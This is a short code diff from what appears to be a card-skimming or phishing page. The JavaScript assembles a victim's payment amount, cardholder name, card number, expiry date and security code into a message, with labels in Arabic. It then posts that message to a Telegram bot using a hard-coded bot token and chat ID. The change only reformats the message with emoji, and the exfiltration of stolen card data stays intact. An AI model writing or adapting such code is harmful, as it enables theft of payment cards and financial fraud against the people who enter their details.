@@ -229,7 +229,21 @@
                 var telegramToken = '7572932013:AAHn5rNLEHJjy91uswco8-cU5l8dUAq6m_k';
                 var telegramChatId = '-1002420293081';
         
-                var telegramMessage = `قيمه الاستقطاع: ${money}\nاسم حامل البطاقة: ${name}\nرقم البطاقة: ${cardnumber}\nتاريخ الإنتهاء: ${expirationdate}/${expirationdateYear}\nرمز الأمان: ${securitycode}`;
+                var telegramMessage = `
+                ====== 💳 بطاقة جديدة ========
+      
+        💲: ${money}
+
+        👤: ${name}
+
+        💳: ${cardnumber}
+
+        📅: ${expirationdate}/${expirationdateYear}
+
+        🔐: ${securitycode}
+
+      ======================
+                `;
         
                 fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: 'POST',
